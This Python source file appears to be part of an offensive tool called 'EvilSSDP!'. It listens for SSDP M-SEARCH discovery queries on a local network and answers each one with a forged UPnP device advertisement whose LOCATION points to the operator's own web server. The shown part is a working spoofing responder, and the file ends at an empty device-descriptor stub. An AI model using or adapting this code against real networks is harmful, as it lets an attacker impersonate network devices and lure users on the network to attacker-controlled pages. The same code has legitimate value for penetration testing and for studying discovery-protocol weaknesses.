import socket
import struct
import sys

# Set up some nice colors
class bcolors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    ORANGE = '\033[93m'
    ENDC = '\033[0m'
okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC

class SSDPListener:
    def __init__(self, localIp, localPort):
        self.sock = None
        self.knownHosts = []
        self.localIp = localIp
        self.localPort = localPort
    def run(self):
        ssdpPort = 1900			# This is defined by the SSDP spec, do not change
        serverName = "EvilSSDP!"
        mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
        serverAddress = ('', ssdpPort)
        knownHosts = []
        
        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Bind to the server address
        self.sock.bind(serverAddress)
        
        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcastGroup)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.localIp))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)
        
        # Receive/respond loop
        while True:
            data, address = self.sock.recvfrom(1024)
            self.process_data(data,address)

    def process_data(self, data, address):
        (remoteIp,remotePort) = address
        if 'M-SEARCH' in str(data):
            if address[0] not in self.knownHosts:
                print(noteBox + "Received an M-SEARCH query from new host {} on port {}".format(remoteIp, remotePort))
                print("    " + okBox + "Subsequent requests from this host will be processed but not printed here.")
                self.knownHosts.append(address[0])
            self.send_location(address)
            self.sock.sendto(b'ack', address) 

    def send_location(self, address):
        URL = bytes('http://{}:{}'.format(self.localIp, self.localPort), 'utf-8')
        reply = b'HTTP/1.1 200 OK\n'
        reply += b'SERVER: Testing SSDP\n'
        reply += b'LOCATION: ' + URL + b'\n'
        reply += b'USN: uuid:e427ce1a-3e80-43d0-ad6f-89ec42e46363::upnp:rootdevice\n'
        reply += b'CACHE-CONTROL: max-age=1800\n'
        reply += b'EXT: \n'
        reply += b'last-seen: 1477147409.432466\n'
        reply += b'ST: upnp:rootdevice\n'
        reply += b'DATE: Sat, 22 Oct 2016 14:44:26 GMT\n'
        self.sock.sendto(reply, address)

class DeviceDescriptor:
    def __init__(self, localIp):
        return
